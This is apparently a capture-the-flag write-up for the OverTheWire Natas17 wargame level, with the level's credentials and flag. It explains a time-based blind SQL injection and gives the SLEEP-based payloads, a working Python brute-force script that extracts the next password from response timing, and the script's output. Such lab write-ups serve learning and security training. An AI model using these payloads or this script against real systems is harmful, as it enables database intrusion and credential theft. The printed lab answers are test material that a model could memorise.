# Natas17

*	user: `natas17`
*	pass: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`
*	url: `http://natas17.natas.labs.overthewire.org`
*	flag: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`

## Procedure

1.	Just another brute force attack very similar to
	[Natas15](../natas15.md) and [Natas16](../natas16.md). The difference
	here is that no text-based evidence about query execution's result
	is provided (see commented line in the source code).

2.	Despite this, we can try with a time-based blind SQL injection. We'll
	reuse solution of [Natas15](../natas15.md) but in this case the
	injected string are

		natas18" AND IF(password LIKE BINARY "%<char>%",SLEEP(15), 1)#

	and

		natas18" AND IF(password LIKE BINARY "<pwd_token>%",SLEEP(15), 1)#

	Below the Python script

		import requests

		pwd_len = 32

		charset_0 = (
			'0123456789' +
			'abcdefghijklmnopqrstuvwxyz' +
			'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
		)
		charset_1 = ''

		target = 'http://natas17.natas.labs.overthewire.org'
		auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
		sleep_time = 15

		for c in charset_0:
			username = 'natas18" AND IF(password LIKE BINARY "%%%c%%",SLEEP(%d), 1)#' % (c, sleep_time)
			r = requests.get(target, auth=auth, params={"username": username}
			)
			s = r.elapsed.total_seconds()
			if s >= sleep_time:
				charset_1 += c
				print ('C: ' + charset_1.ljust(len(charset_0), '*'))

		print ""

		password = ""
		while len(password) != pwd_len:
			for c in charset_1:
				t = password + c
				username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, sleep_time)
				r = requests.get(target, auth=auth, params={"username": username}
				)
				s = r.elapsed.total_seconds()
				if s >= sleep_time:
					print ('P: ' + t.ljust(pwd_len, '*'))
					password = t
					break

3.	Let's try to run the script

		$ python natas17.py
		C: 0*************************************************************
		...
		C: 047dghjlmpqsvwxyCDFIKOP***************************************
		C: 047dghjlmpqsvwxyCDFIKOPR**************************************

		P: x*******************************
		...
		P: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd*
		P: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
